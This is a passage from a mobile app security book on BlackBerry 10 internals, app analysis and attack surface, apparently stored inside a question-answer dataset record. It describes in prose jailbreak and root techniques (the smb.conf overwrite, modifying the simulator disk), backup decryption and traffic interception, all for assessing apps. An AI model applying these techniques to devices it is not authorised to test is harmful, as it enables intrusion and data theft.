and linked to an ELF (Executable\nand Linkable Format; see http://en.wikipedia.org/wiki/Executable_and_Linkable_Format) file that is run by\nLauncher.\nThe resultant binaries are produced using the GCC tool chain, and due to the use of C and C++ are potentially\nvulnerable to a range of memory corruption vulnerability classes. However, BlackBerry by default enables a\nnumber of mitigations to try to complicate the exploitation of these vulnerability classes.\nTo mitigate or complicate the exploitation of any memory corruption vulnerabilities that may be present in an\napp, BlackBerry provides a number of compiler- and linker-implemented or -enabling defenses. BlackBerry\nprovides an overview of these features in its development documentation (http://developer\n.blackberry.com/native/documentation/core/com.qnx.doc.native_sdk\n.security/topic/using_compiler_linker_defenses.html#dho1384790657335).\nThese defenses are enabled by default in the Momentics IDE for new projects to ensure protections are enabled.\nHowever, they are not mandatory and as such you should understand what is available versus what is actually\nenabled on a per-binary basis and audit for their presence. We cover how to audit for their presence later in this\nchapter.\nCascades Applications\nCascades applications (http://developer.blackberry.com/native/\ndocumentation/cascades/dev/fundamentals/) are also native applications; however, they utilize the Qt\nframework to create the user interface (UI). Due to this use of Qt, a number of specific security considerations\nexist over and above those for standard C/C++ apps. These considerations are due to the underlying QML\ntechnology and the attack surface it introduces.\nBlackBerry discusses some of these specific security considerations in a document titled “Security\nconsiderations.” The most striking of these considerations is the possibility of UI spoofing due to HTML\ninjection, and more importantly the risk of script injection (a la JavaScript) into an app:\nIf a Cascades application executes QScript or JavaScript that's controlled by an attacker, it can allow the\nattacker to access application data or control the behavior of the application. For this reason, it is important\nthat applications avoid executing untrusted data as a part of scripts.\nWhen the QScriptEngine class is used to execute scripts, it is important that untrusted values are never\nappended to the string of the script that's being executed. All scripts that are executed by a QScriptEngine\nshould be predefined when developing the application and should never be altered dynamically when the\napplication is running.\n−http://developer.blackberry.com/native/documentation/cascades/best_practices/security/index.html\nThe Qt project itself also provides some advice around QML security; it helpfully provides a list of ways you can\nshoot yourself in the foot.\nUsing import to import QML or JavaScript you do not control. BAD\nUsing Loader to import QML you do not control. BAD\nUsing XMLHttpRequest to load data you do not control and executing it. BAD\n−http://qt-project.org/doc/qt-4.8/qdeclarativesecurity.html\nThis nonexhaustive list is important to keep in mind as we look at how to assess such apps later in this chapter.\nSuffice it to say that although the use of Cascades will accelerate the development of UI aspects, it provides the\nopportunity for extra security vulnerabilities to sneak in.\nHTML5 and JavaScript Applications\nHTML5 and JavaScript apps, also known as WebWorks (https://developer\n.blackberry.com/html5/documentation/v2_1/), are locally run HTML5/JavaScript apps that use the Apache\nCordova framework to expose native device features such as the camera, GPS, and so on to apps. The\nHTML5/JavaScript engine is provided by WebKit combined with some default restrictions around network\nrequests and the ability to access files or paths not inside the applications package.\nFrom an app hacker's perspective, several interesting considerations exist with regard to WebWorks apps. The\nfirst consideration is that BlackBerry doesn't provide anywhere near the same level of proactive security\nguidance to developers that it does for other languages. The second is the possibility exists for developers to\nwrite custom extensions and expose them to their HTML5/JavaScript app, which opens the opportunity for\nsecurity issues to arise. Details on how developers can write custom Cordova plug-ins are provided on the\nBlackBerry developer site\n(https://developer.blackberry.com/html5/documentation/v2_1/using_custom_plugins.html). These\nextensions are comprised of a JavaScript interface and a native implementation. The ability to extend apps in\nthis way brings with it a wide range of possibilities from creating exploitable memory corruption conditions\nfrom seemingly innocuous web technologies to a raft of potential logic vulnerabilities.\nAndroid Applications\nAndroid applications on BlackBerry 10 are simply repackaged. That is, the original APK (Android Package) is\nretained and wrapped in a BAR structure.\nThe accomplishment for the Android run time on BlackBerry is pretty impressive when you consider that\nBlackBerry ported the binder Linux kernel driver used on traditional Android devices to a QNX Resource\nManager. The Dalvik VM and Zygote concept were also ported across. As a result, the ability to run native\nAndroid apps is indeed that—native. A vast majority of the Android run time is present, allowing near-seamless\ncompatibility with a wide variety of apps.\nAndroid app security is covered extensively in other parts of this book and as a result won't be covered here.\nHowever, you should understand that the same inter-app attack paths (that is, those that occur via Android IPC\nmechanisms) translate due to the wholesale porting of the run time and framework.\nDistributing Applications\nApplications for BlackBerry 10 are solely distributed via BlackBerry World (formerly AppWorld), which is the\nBlackBerry storefront. BlackBerry 10 does not provide the ability to sideload applications, unlike BlackBerry\nLegacy. This restriction has in some cases been worked around via a variety of different methods, namely:\nDeveloper mode—Using the mode intended for developers\n(http://developer.blackberry.com/playbook/native/documentation/com\n.qnx.doc.native_sdk.devguide/com.qnx.doc.native_sdk.devguide/topic/t_setup_enable_devmode_device.html\nSachesi—Originally DingleBerry, but dramatically enhanced to allow sideloading within Developer mode\n(https://github.com/xsacha/Sachesi/releases)\nSideSwype—A commercial service that uses a VPN (https://sideswype.me/)\nAnother tool of note, the Chrome ExtensionBB10/PlayBook App Manager, provides a convenient method of\nsideloading apps and generally controlling what is installed\n(https://chrome.google.com/webstore/detail/bb10-playbook-app-\nmanager/kmbaalodpmjjhpobkgljnelbpblnikkp?hl=en).\nIn enterprises, BlackBerry World introduces a concept of a work channel:\n…application can be deployed over-the-air by administrators as an optional application or as a required\napplication, where the user cannot remove it.\n−http://developer.blackberry.com/distribute/enterprise_application_distribution.html\nThis feature allows administrators to control and mandate which apps are installed or installable on enterprise-\nmanaged devices using the core AppWorld technologies and distribution mechanisms.\nPPS Objects\nPPS is a long-standing QNX concept that has been used extensively in the context of BlackBerry 10. QNX\ndescribes PPS as follows:\nThe QNX Persistent Publish/Subscribe (PPS) service is a small, extensible publish/subscribe service that\noffers persistence across reboots. It is designed to provide a simple and easy-to-use solution for both\npublish/subscribe and persistence in embedded systems, answering a need for building loosely connected\nsystems using asynchronous publications and notifications.\nWith PPS, publishing is asynchronous: the subscriber need not be waiting for the publisher. In fact, the\npublisher and subscriber rarely know each other; their only connection is an object which has a meaning and\npurpose for both publisher and subscriber.\n−http://www.qnx.co.uk/developers/docs/6.5.0/index.jsp?\ntopic=%2Fcom.qnx.doc.neutrino_pps%2Fpps.html\nAs with Authman and Launcher, PPS has been reused for certain high-level purposes in other QNX-derived\nplatforms, thus the PPS Object Reference for QNX CAR translates in a majority of cases to BlackBerry 10\n(http://support7 .qnx.com/download/download/26319/PPS_Objects_Reference.pdf).\nGenerally, these PPS objects are not accessed directly; instead they are abstracted by higher level APIs that\nBlackBerry makes available to developers via libraries. An example of this abstraction is when using the\nBluetooth API published by BlackBerry\n(http://developer.blackberry.com/native/documentation/core/com.qnx.doc.bluetooth/topic/t_bluetooth_use_spp.html\nand actually uses PPS under the hood.\nThis knowledge can be useful when you're researching the platform for exposed, yet undocumented features in\ndevices and service endpoints.\nUnderstanding the BlackBerry 10 Security Model\nMost of the BlackBerry-specific aspects of QNX are higher-level concepts that are built on top of operating\nsystem primitives. For example, app sandboxing is primarily enforced through a combination of user and group\nfilesystem permissions (for varying definitions of the file), separate operating system users and associated\ngroups for each app, and PF firewall rules. In the sections that follow we describe these features in more detail.\nProcess Sandboxing\nFor BlackBerry 10 process sandboxing is described in some detail in the “BlackBerry Enterprise Server 10\nTechnical Overview” (http://docs.blackberry\n.com/en/admin/deliverables/66547/BES10_v10.2.4_BDS_Security_Technical_Overview_en.pdf). It also\ndiscusses in detail app sandboxing:\nThe BlackBerry 10 OS uses a security mechanism called sandboxing to separate and restrict the capabilities\nand permissions of apps that run on the BlackBerry 10 device. Each application process runs in its own\nsandbox, which is a virtual container that consists of the memory and the part of the filesystem that the\napplication process has access to at a specific time.\nEach sandbox is associated with both the app and the space that it is used in. For example, an app on a\nBlackBerry Balance device can have one sandbox in the personal space and another sandbox in the work\nspace; each sandbox is isolated from the other sandbox.\nThe BlackBerry 10 OS evaluates the requests that an application's process makes for memory outside of its\nsandbox. If a process tries to access memory outside of its sandbox without approval from the BlackBerry 10\nOS, the BlackBerry 10 OS ends the process, reclaims all of the memory that the process is using, and restarts\nthe process without negatively affecting other processes.\nWhen the BlackBerry 10 OS is installed, it assigns a unique group ID to each app. Two apps cannot share the\nsame group ID, and the BlackBerry 10 OS does not reuse group IDs after apps are removed. An app's group ID\nremains the same when the app is upgraded.\n−http://docs.blackberry.com/en/admin/deliverables/66547/BES10_v10.2.4_BDS_Security_Technical_Overview_en.pdf\nApplication Capabilities\nWithin BlackBerry 10 a core security foundation is the per-process capabilities model. The existence of this\nhigh-level capability context is detailed in the “Security Technical Overview for BlackBerry Device Service 6.0\nand BlackBerry PlayBook Tablet 2.0” document (http://docs.blackberry.com/en/admin/\ndeliverables/40478/BlackBerry_Device_Service_6.0_and_BlackBerry_PlayBook_Tablet_2.0.1-\nSecurity_Technical_Overview-1329934562720-6.0-en.pdf). PlayBook OS was the precursor to BlackBerry 10,\nand many fundamental concepts were devised during its design.\nThe PlayBook OS uses sandboxing to separate and restrict the capabilities and permissions of applications\nthat run on the tablet. Each application process runs in its own sandbox.\n…\nThe BlackBerry PlayBook tablet is designed to minimize the number of processes running as root. Only the\nmost essential first-party processes and no third-party processes can run as root. A subset of root capabilities\nis available to first-party processes that do not need full root capabilities.…\nThe kernel validates requests for resources and an authorization manager controls how applications access\nthe capabilities of the tablet.\nBlackBerry publishes a list of permissions that are allowed in third party–developed apps\n(http://developer.blackberry.com/native/documentation/core/com.qnx.doc.native_sdk.devguide/topic/c_appfund_accessing_restricted_functionality.html\nThese are as of September 2014 (article last updated July 2014):\nbbm_connect—Connect to BlackBerry Messenger (BBM). You can use this permission to access contact lists\nand user profiles, invite BBM contacts to download your app, initiate BBM chats, share content from within\nyour app, and stream data between apps.\naccess_pimdomain_calendars—Access the calendar on the device. This access includes viewing, adding, and\ndeleting calendar appointments.\nuse_camera—Access data that's received from the cameras on the device. With this permission, your app can\ntake pictures, record videos, and use the flash.\nuse_camera_desktop—Take a screenshot or video of any information visible on the screen of the device. This\npermission also allows the app to share the user's screen.\naccess_pimdomain_contacts—Access the contacts that are stored on the device. This access includes viewing,\ncreating, and deleting contacts.\nread_device_identifying_ information—Access unique device identifiers, such as the PIN or the serial\nnumber. This permission also allows you to access SIM card information on the device.\naccess_pimdomain_messages—Access the email and PIN messages that are stored on the device. This access\nincludes viewing, creating, sending, and deleting messages.\nuse_gamepad—Access gamepad functionality. This permission also indicates that the app has official gamepad\nsupport in the BlackBerry World storefront.\nread_geolocation—Read the current GPS location of the device (deprecated).\n_sys__manage_pimdomain_ external_accounts *—Create a custom account that's accessible in the\nBlackBerry Hub. This capability requires special permissions from BlackBerry.\n_sys_access_pim_unified *—Integrate with the BlackBerry Hub. With this permission, your app can create\nand manage data in the BlackBerry Hub. This capability requires special permissions from BlackBerry.\naccess_internet—Use the Internet connection from a Wi-Fi, wired, or other type of connection to access\nlocations that are not local on the device.\naccess_location_services—Access the current location of the device, as well as locations that the user has\nsaved.\nrecord_audio—Access the audio stream from the microphone on the device.\nread_personally_identifiable_information—Access user information on the device, such as the first name,\nlast name, and BlackBerry ID username of the user currently associated with this device.\nnarrow_landscape_exit—Reduce the width of the region along the bottom bezel of the device that accepts\nswipe-up gestures. When you use this permission, swipe-up gestures are recognized in a more narrow area\nalong the bottom bezel.\naccess_pimdomain_notebooks—Access the content that's stored in notebooks on the device. This access\nincludes adding entries to, and deleting entries from, the notebooks.\naccess_notify_settings_control—Change global notification settings. Apps have permission to read their\nown notification settings.\naccess_phone—Determine when a user is on a phone call. This access also allows an app to access the phone\nnumber assigned to the device and send DTMF (Dual Tone Multi-Frequency) tones.\n_sys_inject_voice—Add audio to a phone call.\nread_phonecall_details—View the status of phone calls that are in progress and the phone number of the\nremote party.\naccess_pimdomain_calllogs—View the logs of previous incoming or outgoing phone calls.\ncontrol_phone—Control the current phone call. This access includes ending a phone call and sending DTMF\ntones to the phone.\npost_notification—Post notifications to the notification area of the device screen. This permission does not\nrequire the user to grant your app access.\n_sys_use_consumer_push—Access the Push service to receive and request push messages.\nrun_when_backgrounded—Perform background processing. Without this permission, your app stops all\nprocessing when the user changes focus to another app.\n_sys_run_headless—Perform certain tasks in the background, without opening the app, for a short period of\ntime.\n_sys_headless_nostop—Run in the background always. You must request access before your app can run as a\nlong-running headless app.\naccess_shared—Read and write files that are shared between all apps on the device. With this permission,\nyour app can access pictures, music, documents, and other files that are stored on the user's device, at a\nremote storage provider, or on a media card.\n_sys_access_smartcard_api*—Encrypt, decrypt, sign, and verify data using a smartcard. This capability\nrequires special permissions from BlackBerry.\n_sys_smart_card_driver*—Allow third-party smartcard drivers and smartcard reader drivers to integrate\nwith the Smartcard service. This capability requires special permissions from BlackBerry.\n_sys_access_extended_smart_card_functionality *—Use APDU (Application Protocol Data Unit) for\ncustom commands. This permission is restricted. This capability requires special permissions from\nBlackBerry.\naccess_sms_mms—Access the text messages that are stored on the device. This access includes viewing,\ncreating, sending, and deleting text messages.\naccess_wifi_public—Receive Wi-Fi event notifications such as Wi-Fi scan results or changes in the Wi-Fi\nconnection state.\nCode Signing\nAs you would expect there is code signing on BlackBerry 10. This is done to ensure integrity of the BARs as well\nas to authorize the use of capabilities within your app:\nEach app must be signed to allow BlackBerry to validate the application's capabilities and issue unique\nidentifiers for it.\nHowever, in recent SDKs you don't actually have to back up and look after the keys yourself. These are taken\ncare of by being stored under your BlackBerry ID (yes, this does mean BlackBerry has a copy\n(http://devblog.blackberry .com/2013/08/code-signing-keys-be-gone-welcome-blackberry-id/). The signing\nprocess itself is simple to do:\nblackberry-signer -proxyhost 192.168.1.1 -proxyport 80 -register -csjpin\n<csj pin> -storepass <KeystorePassword> <client-RDK-xxxxxx.csj file>\n<client-PBDT-xxxxx.csj file>BlackBerry Balance\nBlackBerry Balance (mentioned in a quotation earlier in this chapter) is a technology that allows two digital\nworlds to exist—one for corporate data and one for personal. BlackBerry provides extensive documentation on\nthe architecture of this technology in the document “How BlackBerry Balance Works at a Platform Level”\n(http://uk.blackberry.com/content/dam/blackBerry/pdf/business/english/Separating-Work-and-Personal-\nHow-BlackBerry-Balance-Works-at-the-Platform-Level.pdf) and in the already-mentioned “BlackBerry\nEnterprise Server 10 Technical Overview.”\nHowever, in the context of BlackBerry Balance, recognizing that the separation is only as robust as the kernel\nand the associated integrity mechanisms is important. BlackBerry Balance is not implemented as a hypervisor\n(virtualization) with two separate kernels. Instead it is implemented within the same kernel using a mixture of\nfilesystem, object controls, higher-level capabilities, and logical separation to provide the dual world. BlackBerry\nBalance can be thought of as akin to Samsung's KNOX for Android, and it is useful to understand the limitations\nof this architecture.\nBlackBerry Balance offers the following at its core:\nProcess separation—Enforced by the QNX kernel\nProcess capabilities—To control what level of access a process has\nProcess users—To facilitate separation and restrict what resources a process can access\nProcess groups—To facilitate separation and restrict what resources a process can access\nAccess control lists—On file object\nFirewall rules—Restricts network traffic including traffic destined for local host\nNOTE\nFor details on the exploit mitigation features refer to Chapter 17 and the section titled, “Compiler and\nLinker Defenses.”\nBlackBerry 10 Jailbreaking\nOne public jailbreak thus far has affected QNX-based BlackBerry devices — DingleBerry, released in November\n2011 (http://crackberry.com/so-you-want-rootjailbreak-your-blackberry-playbook-dingleberry-\nhere%E2%80%99s-how-do-it). No jailbreaks have directly affected BlackBerry 10. However, this jailbreak is worth\ndiscussing in the context of the platform because the PlayBook OS provides the foundations to BlackBerry 10.\nThe DingleBerry jailbreak worked by exploiting a weakness in the backup and restore process, which allowed the\noverwriting of the smb.conf file used by the Samba server that ran as root. In short, a window of opportunity\nduring the restore process allowed the overwriting of smb.conf to have it reinterpreted by the Samba daemon.\nThus allowing the execution of arbitrary commands as root. This ability was then used to allow root to SSH\n(Secure Shell) into the device and thus provide a jailbreak.\nThis example demonstrates that, as with all mobile OSs (Linux/Android, Linux/FireFoxOS, iOS, Windows\nPhone, and so on), the goal of a jailbreak is to escalate privileges to root or higher.\nIn response to this type of risk, BlackBerry introduced a number of new defense in-depth mechanisms designed\nto improve device integrity verification. These mechanisms were designed to thwart similar exploitation\ntechniques if discovered and used in the future.\nHowever, jailbreaking the simulator is still possible. Note: This is not considered a security issue and is an\naccepted risk. Jailbreaking the simulator is possible because no chain of trust exists from the CPU and beyond\nduring the boot and execution process to verify code signing of the different software components.\nThus if you are looking to investigate the platform or assess apps that don't have a native code element in a\ndynamic manner, then the jailbreaking capability may be useful. The most common way to leverage the\ncapability to jailbreak (in the loosest sense of the term) is to run an app within the simulator, boot a standard\nQNX image, and mount the virtual storage that was previously attached to the BlackBerry 10 simulator within\nVMware. This approach allows you to investigate the data stored and generated logs that would otherwise be off\nlimits.\nIf, on the other hand, you do have an app that needs to be run on a real device due to the use of native code, you\ncan repackage the BAR file and use Developer mode to run the device within the devuser context.\nUsing Developer Mode\nDeveloper mode enables you to sideload apps onto the device outside of AppWorld, which allows you to SSH\ninto the device as devuser and run unsigned binaries. To do this, follow these steps:\n1. Enable Developer mode by going to Settings Security & Privacy Developer Mode as shown in Figure 14.1.\nA notification appears in the Hub.\n2. Generate an RSA 4096 key pair; for example, on Linux:\nssh-keygen -b 4096 -t rsa\n3. Run blackberry-connect from the SDK to transfer the public key to the device:\nblackberry-connect YOUR_DEVICEIP -password YOUR_DEVICE_PASSWD\n-sshPublicKey id_rsa.pub\n4. You should see output similar to the following if the connection is successful:\n./blackberry-connect 169.254.0.1 -devicePassword BB4Life\n-sshPublicKey Key_4096_rsa.pub\nInfo: Connecting to target 169.254.0.1:4455\nInfo: Authenticating with target 169.254.0.1:4455\nInfo: Encryption parameters verified\nInfo: Authenticating with target credentials.\nInfo: Successfully authenticated with target credentials.\nInfo: Sending ssh key to target 169.254.0.1:4455\nInfo: ssh key successfully transferred.\nInfo: Successfully connected. This application must remain running in\norder to use debug tools. Exiting the application will terminate this\nconnection.\n5. You can now SSH into the device using the private key as devuser:\nssh devuser@YOUR_DEVICE_IP_ADDRESS\nVoilà — you will be SSHed in and able to run compiled binaries of your choice within the constraints of\ndevuser.\nFigure 14.1 The Developer Mode menu\nTo install apps in a non-release manner you need a debug token. This allows you to install apps via the\nblackberry-deploy tool but only on the device to which the debug token is assigned. Note that debug tokens are\nvalid for only 30 days by default and thus their value in real-world deployments is limited.\nThe BlackBerry 10 Device Simulator\nThe BlackBerry 10 Device Simulator design (http://developer.blackberry .com/develop/simulator/)\nrepresents a departure in terms of approach when compared to BlackBerry Legacy. Due to architectural\ndifferences between the device and a PC (ARM versus X86/X64), VMWare Virtual Machine images are used.\nDue to the use of Virtual Machine images there are both positive and negative aspects. The primary positive is\nthat these images are easy to investigate and get root on the platform via a number of ways.\nAs previously mentioned the most common way to get root is to mount the disk using a standard QNX image\n(http://www.qnx.com/download/feature .html?programid=21367) and either replace a binary or modify the\nconfiguration files to yield root access (such as smb.conf). The negative aspect of using the simulator is that due\nto the architectural differences you can't run native code that is intended for a device on the simulator.\nHowever, for WebWorks and Android apps, the simulator can still be highly effective as a means to doing\nanalysis due to no difference other than CPU architecture when compared to a real device.\nAccessing App Data from a Device\nIn the very earliest days of BlackBerry PlayBook, obtaining access to the backed-up app data the .bbb files\nproduced was possible via Desktop Manager. This ability, however, raised concerns from multiple software\nvendors due to the risk of piracy on the platform. So to combat this issue BlackBerry started encrypting the .tar\nfiles, which are contained in the .bbb named zip files prior to transfer to the desktop. Elcomsoft publicly\ndisclosed how the backup encryption worked:\nBackups generated by BlackBerry Link are encrypted using the key generated by BlackBerry servers, provided\nthe BlackBerry ID, password, and device ID. The first and third components can be obtained from the backup\nitself, and if you have the password, then we are able to get the encryption key and decrypt the backup\n−http://www.forensicfocus.com/Forums/viewtopic/\nprintertopic=1/t=10493/start=7/postdays=0/postorder=asc/vote=viewresult/\nElcomsoft's capability to decrypt BlackBerry 10 backups has subsequently been incorporated into two\ncommercial products:\nElcomsoft Phone Password Breaker Forensic Edition—http://www .elcomsoft.co.uk/eppb.html –\nhttp://www.elcomsoft.co.uk/help/en/eppb/decrypt_blackberry_link_backup.html\nOxygen Forensic® Suite 2014, which licenses Elcomsoft's technology—http://www.oxygen-\nforensic.com/en/events/press-releases/326-oxygen-forensic-suite-2014-breaks-into-blackberry-10-\nbackups\nUsing this approach of decrypting the backup files using either of the products mentioned you can access\nconfiguration files and logs from a live device, as shown in Figure 14.2.\nFigure 14.2 Elcomsoft cracking the BlackBerry backup encryption\nAfter the backups are decrypted, you end up with a .bbb file that contains three .tar files. The appdata.tar file\ncontains the app-related information you are interested in for each of the installed applications.\nAccessing BAR Files\nAccessing BAR files for arbitrary applications in BlackBerry World (formerly App World) isn't currently\npublically documented.\nObtaining BAR files via backup files was possible when the PlayBook was first launched. BlackBerry\nsubsequently mitigated this vector by encrypting the backups to protect the app data (see previous section on\nhow to get around this protection) and by not backing up the application binaries at all.\nAlthough not impossible, obtaining access to BAR files is outside the scope of this book due to the risk of piracy.\nHowever, accessing the BAR files that ship (that is, are free) in the stock firmware image by using Sachesi is\npossible:\n1. Run Sachesi and download the firmware as shown in Figure 14.3.\nAlternatively, you can download one of the base image autoloaders\n(http://developer.blackberry.com/blackberry10devalpha/allautoloaders.html).\n2. Split the downloaded firmware image, as shown in Figure 14.4.\n3. Extract the apps, as shown in Figure 14.5.\nYou can now find a number of BAR files for both the system elements as well as default apps, as shown in\nFigure 14.6.\nFigure 14.3 Sachesi helps you access BAR files\nFigure 14.4 Splitting the firmware image using Sachesi\nFigure 14.5 Extracting the application using Sachesi\nFigure 14.6 The extracted application\nYou can then extract these BAR files and analyze their contents.\nLooking at Applications\nThis section walks you through the initial analysis of a couple of apps to give you a feel for the high-level steps\nyou would follow.\nNetwork Traffic Analysis and Interception\nDepending on the approach, employed to perform network traffic analysis and interception you can perform\ntraffic analysis in a variety of ways with varying degrees of insight and success.\nThe most comprehensive traffic analysis methods are\nSniffing traffic from the simulator to analyze all unencrypted traffic\nSniffing the local Wi-Fi network to analyze the unencrypted traffic from a real device\nUsing Mallory in-line to intercept and modify traffic (https://github .com/intrepidusgroup/Mallory)\nThe somewhat comprehensive traffic methods include\nManually configuring a Wi-Fi proxy setting to force proxy-aware apps via BurpProxy or similar\nUsing an enterprise configuration to configure a proxy server\nUse a proxifier and the simulator to force traffic via an intermediary proxy\nNote that on real devices (at least in 10.2), configuring a new arbitrary Certificate Authority for a non-\nenterprise–enabled device that is trusted device-wide seems impossible. This inability to trust a new root CA\ndevice-wide results in the inability to succeed at certain SSL/TLS man-in-the-middle attacks where certificate\nvalidation is enforced. However, some apps may still prompt the user to authorize the connection although the\nserver's certificate can't be trusted, and thus allow analysis. This same limitation with regard to man-in-the-\nmiddle attacks does not exist in the simulator, though.\nBAR Archives\nIn this section you will look at how to extract the relevant parts of the BAR archives.\n1. Take the original BAR file, make a copy, and rename it to .zip as shown in Figure 14.7.\n2. Extract the zip, and two directories appear, as shown in Figure 14.8.\n3. Go into META-INF and open the MANIFEST.MF file, as shown in Figure 14.9.\nIn this highlighted example you can see:\nArchitecture target\nDevelopment mode\nEntry point type\nCapabilities (permissions)\nEntry point actions\nInvocation filter URIs\nThe invocation filter URIs mechanism is documented extensively within the SDK but in short, it details\nthe methods via which the app can be invoked and the URIs\n(http://developer.blackberry.com/native/documentation/cascades/device_platform/invocation/receiving_invocation.html\n4. Go up the directory again to the structure shown in Figure 14.10.\nYou can then go into the native subdirectory, as shown in Figure 14.11.\n5. In the native directory notice the bar-descriptor.xml (http://developer\n.blackberry.com/native/documentation/core/com.qnx.doc.native_sdk\n.devguide/topic/c_about_bar_app_descriptor_file.html) file, which in this example is fully commented\nand used to generate the MANIFEST .MF, as shown in Figure 14.12.\n6. libClock.so is a native ELF binary and the entry point for the application. Going into the assets subdirectory\nreveals several .QML files because this is a Cascades-based application, as shown in Figure 14.13.\nThese QML files contain human-readable code that you can easily review, as shown in Figure 14.14.\nFigure 14.7 Rename the original BAR file\nFigure 14.8 Result of extracting the BAR file\nFigure 14.9 Example MANIFEST.MF file\nFigure 14.10 BAR root directory\nFigure 14.11 Contents of the native directory\nFigure 14.12 The bar-descriptor.xml file\nFigure 14.13 The Assets subdirectory\nFigure 14.14 Example QML file\nThe assets subdirectory will likely be where you spend most of your time investigating. Other types of things\nyou may find in this directory include (previously observed in Figure 14.13):\nSSL certificate databases—Databases that contain SSL certificates\nCustom configuration files—For the application that can contain sensitive information or influence\nprogram execution\nELF Binaries\nFor analyzing the ELF binaries themselves, you basically use three tools:\nIDA Pro—Use this for reverse engineering the native application components.\nreadelfandobjdumpetc—Cross-compiled; that is, it can run on X86 yet parse ARM7 ELF binaries.\nchecksec.sh—This is a shell script that uses readelf to verify a number of protection mechanisms and other\npossible weaknesses.\nThe specifics of reversing ELF binaries are beyond this book. Many good references are available that show how\nto approach this problem. Suffice it to say these references all generally translate to QNX ELF binaries.\nHTML5 and JavaScript\nLooking at the MANIFEST.MF for a WebWorks app reveals some useful information, as shown in Figure 14.15.\nFigure 14.15 The MANIFEST.MF file for a WebWorks application\nLooking at the file referenced as the entry point (app/native/wwe) you see the information shown in Figure\n14.16.\nFigure 14.16 The entry point for a WebWorks application\nYou can see the file is just a shell script. The QNX documentation on HTML5 Developer's Guide\n(http://support7.qnx.com/download/download/26199/s_Guide.pdf) explains that it causes index.html to be\nloaded. This index.html is contained in the BAR's native subdirectory (as shown in Figure 14.17).\nFigure 14.17 The BARs native subdirectory\nIn this particular case if you go into the plugins directory and then the jnext directory, you see the file shown in\nFigure 14.18.\nFigure 14.18 The jnext directory\nWhat is JNEXT? It stands for JavaScript Native EXTensions, this is a way of adding JavaScript bridges to native\nC libraries; the purpose of auth.txt is described as follows:\nThe set of URLs that are authorized to access JNEXT libraries for a specific browser is defined in a file named\nauth.txt.\n−http:// www.jnext.org/using.html\nIn this particular example, these URIs are very lax and would be a security concern.\nBeyond what we've just covered it is then a process of auditing the JavaScript, plug-ins, and so on for\nvulnerabilities.\nSummary\nThis chapter covered a broad range of topics, enabling you to deepen your analysis of BlackBerry apps. We\nreviewed the following concepts:\nBlackBerry Legacy security architecture, code signing, and app analysis\nBlackBerry 10 concepts\nBlackBerry 10 key security aspects\nBlackBerry 10 and jailbreaking relevance\nBlackBerry 10 Developer mode and the device simulator\nAccessing data from BlackBerry 10 devices via encrypted backups\nAccessing BAR files\nDeconstructing apps and performing an initial analysis",
    "question": "What are the key differences between BlackBerry Legacy and BlackBerry 10 in terms of their architecture, security model, and application analysis techniques?",
    "summary": "BlackBerry was once the dominant business smartphone platform, and while its dominance has declined, analyzing its apps remains relevant. This chapter explains the security aspects, tools, and techniques for analyzing BlackBerry Legacy and BlackBerry 10 apps, including their unique formats, code signing, and sandboxing mechanisms. It also covers how to reverse engineer COD and BAR files, analyze app capabilities, and access data from devices, with a focus on security considerations and potential vulnerabilities in both Java-based and WebWorks applications."
  },
  {
    "start": 89,
    "end": 90,
    "text": "CHAPTER 15\nAttacking BlackBerry Applications\nIn the previous chapter you learned about the underpinnings of BlackBerry applications and how to analyze\nthem primarily in a static fashion. To be able to put these analysis techniques into practice, you also need to\nknow about the attack surface of an app. Knowing about the app enables you to choose the correct technique to\nemploy. Although each app is different in terms of attack surface, several elements are more common than not.\nIn this chapter we look at each of these attack surface elements and how they might be attacked. In the previous\nchapter you looked at some of the BlackBerry 10 app security fundamentals, architectural elements, and base\nsecurity analysis techniques for apps, but in this chapter you dig a little deeper by looking at a number of\nfundamental concepts for BlackBerry 10 apps and how they can be attacked.\nAs with apps on any other operating system, whether it’s a full-fledged, general-purpose OS or a proprietary,\nhardware-abstracting, real-time OS, the principles of analyzing and attacking apps are the same. Namely, you\nwant to be able to perform the following tasks:\nIdentify inputs that traverse trust boundaries over which an attacker has influence or control with the goal of\ndisrupting, influencing, or changing app execution or behavior.\nIntercept secure transport mechanisms with the goal of inspecting or modifying the data protected by it.\nIntercept transport mechanisms with the goal of modifying the data.\nExtract and/or modify data via an in- or out-of-band mechanism held in an app’s sandbox to understand\nwhat, if any, sensitive data is persisted.\nTraversing Trust Boundaries\nThe trust boundary of a BlackBerry 10 app is in the first instance of the operating system user that the app runs\nas. It is a trust because each app is run as a separate user to implement the sandboxing concepts discussed in\nthe previous chapter. A second trust boundary may then exist in devices that are configured as balance enabled.\nBalance devices are configured with a personal half and an organization-controlled half that are separated from\neach other via a variety of access control lists at the file and network level coupled with process separation. This\nlooks like Figure 15.1.\nFigure 15.1 Container separation in BlackBerry Balance\nIn the diagram in Figure 15.1 each app has its own private data sandbox within which to operate, but is also free\nfrom runtime modification of the executable image. The inter-container communication includes another\ndegree of separation. That is, the interprocess communication mechanisms that would be available between App\n1, App 2, and App 3 within their own container are typically disabled or limited in intercontainer situations. A\ncouple examples of mechanisms that are limited in such a configuration include shared files and the clipboard.\nWithin QNX and thus BlackBerry 10, the following interprocess communication mechanisms exist, which allow\nfor trust boundary traversal:\nFiles—These are persistent file objects held on a traditional file permission that can be secured with\ntraditional UNIX user and group permissions coupled with extended attributes from POSIX 1e\n(http://developer .blackberry.com/native/reference/core/com.qnx.doc.neutrino\n.utilities/topic/s/setfacl.html and http://developer.blackberry\n.com/native/reference/core/com.qnx.doc.neutrino.utilities/topic/ g/getfacl.html)\nNetwork sockets—Typically, these are TCP or UDP sockets that may be bound to localhost or an external\nnetwork interface. No native concept of access control lists exists for these. They are instead typically\nimplemented by the use of a firewall. Alternatively, the high-level protocol that operates over sockets may\nimplement its own form of authentication and/or authorization.\nUNIX domain sockets—These are different from files and network sockets. Typically they are used where\nthe overhead of a TCP connection establishment and the ability to communicate off device are not wanted.\nShared memory—This is a primitive in POSIX systems. The concept is that there is named and unnamed\nshared memory that may be made available to other processes depending on the umask settings.\nPPS objects—These are implemented in the guise of files. However, the underlying implementation is a\nresource manager (QNX terminology) that implements that part of the filesystem namespace. They are\nbound by the same access control lists that files and directories are.\nChannel/message—This is one of the lowest-level IPC (Inter-Process Communication) mechanism\nconcepts on QNX and upon which many of the higher level aspects are built.\nEvents—These build on channels and messages to provide an event model.\nTyped memory—Typed memory is POSIX functionality defined in the 1003.1 specification. It’s part of the\nadvanced real-time extensions. You would not normally expect apps to use typed memory for their own\npurposes; it is only listed here for completeness.\nThe native SDK documentation discusses a number of these in 